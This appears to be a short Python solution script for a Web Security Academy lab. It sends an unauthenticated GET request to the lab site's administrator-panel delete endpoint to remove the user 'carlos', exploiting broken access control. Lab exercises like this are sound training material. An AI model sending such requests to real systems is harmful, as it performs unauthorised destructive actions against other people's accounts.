import requests
page = requests.get("https://0a93006004ad368d8148110b009000db.web-security-academy.net/administrator-panel/delete?username=carlos")
print(page.content)